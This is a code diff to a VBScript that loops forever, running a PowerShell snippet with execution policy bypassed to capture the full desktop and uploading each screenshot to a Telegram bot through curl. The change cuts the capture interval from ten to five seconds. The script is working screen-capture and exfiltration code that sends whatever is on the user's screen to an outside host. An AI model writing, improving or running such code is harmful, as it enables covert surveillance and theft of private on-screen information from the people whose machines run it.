@@ -12,29 +12,28 @@ screenshotFilePath = script_directory & "\screenshot.png"
 
 ' Create a simplified PowerShell script that uses a different method for taking screenshots
 powershell_script = "$ScreenshotPath = '" & screenshotFilePath & "'" & vbCrLf & _
-"Add-Type -AssemblyName System.Windows.Forms,System.Drawing" & vbCrLf & _
-"$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen" & vbCrLf & _
-"$Width = $Screen.Width" & vbCrLf & _
-"$Height = $Screen.Height" & vbCrLf & _
-"$Left = $Screen.Left" & vbCrLf & _
-"$Top = $Screen.Top" & vbCrLf & _
-"$Bitmap = New-Object System.Drawing.Bitmap $Width, $Height" & vbCrLf & _
-"$Graphics = [System.Drawing.Graphics]::FromImage($Bitmap)" & vbCrLf & _
-"$Graphics.CopyFromScreen($Left, $Top, 0, 0, $Bitmap.Size)" & vbCrLf & _
-"$Bitmap.Save($ScreenshotPath)" & vbCrLf & _
-"$Graphics.Dispose()" & vbCrLf & _
-"$Bitmap.Dispose()"
+    "Add-Type -AssemblyName System.Windows.Forms,System.Drawing" & vbCrLf & _
+    "$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen" & vbCrLf & _
+    "$Width = $Screen.Width" & vbCrLf & _
+    "$Height = $Screen.Height" & vbCrLf & _
+    "$Left = $Screen.Left" & vbCrLf & _
+    "$Top = $Screen.Top" & vbCrLf & _
+    "$Bitmap = New-Object System.Drawing.Bitmap $Width, $Height" & vbCrLf & _
+    "$Graphics = [System.Drawing.Graphics]::FromImage($Bitmap)" & vbCrLf & _
+    "$Graphics.CopyFromScreen($Left, $Top, 0, 0, $Bitmap.Size)" & vbCrLf & _
+    "$Bitmap.Save($ScreenshotPath)" & vbCrLf & _
+    "$Graphics.Dispose()" & vbCrLf & _
+    "$Bitmap.Dispose()"
 
 ' Define the file path for the PowerShell script
 temp_ps_file = script_directory & "\temp_screenshot.ps1"
 
-' Infinite loop to take a screenshot every 10 seconds
-Do
-    ' Save the PowerShell script to a temporary file
-    Set objFile = objFSO.CreateTextFile(temp_ps_file, True)
-    objFile.WriteLine powershell_script
-    objFile.Close
+' Save the PowerShell script to a temporary file
+Set objFile = objFSO.CreateTextFile(temp_ps_file, True)
+objFile.WriteLine powershell_script
+objFile.Close
 
+Do
     ' Execute PowerShell script with visibility and wait for completion
     objShell.Run "powershell -ExecutionPolicy Bypass -File """ & temp_ps_file & """", 1, True
 
@@ -46,25 +45,20 @@ Do
         ' Send the screenshot to Telegram using curl instead of XMLHTTP
         curlCommand = "curl -F ""chat_id=" & chat_id & """ -F ""photo=@" & screenshotFilePath & """ https://api.telegram.org/bot" & telegram_token & "/sendPhoto"
         objShell.Run "cmd /c " & curlCommand, 0, True
-        
+
         ' Wait for Telegram to process the request
         WScript.Sleep 2000
-        
+
         ' Delete the screenshot file after sending it
         If objFSO.FileExists(screenshotFilePath) Then
             objFSO.DeleteFile screenshotFilePath
         End If
-        
+
         MsgBox "Screenshot sent successfully!"
     Else
         MsgBox "Screenshot file was not created. Please check your script."
     End If
 
-    ' Clean up and delete the temporary PowerShell script
-    If objFSO.FileExists(temp_ps_file) Then
-        objFSO.DeleteFile temp_ps_file
-    End If
-
-    ' Wait for 10 seconds before taking another screenshot
-    WScript.Sleep 10000 ' 10 seconds
+    ' Wait for 5 seconds before taking another screenshot
+    WScript.Sleep 5000
 Loop
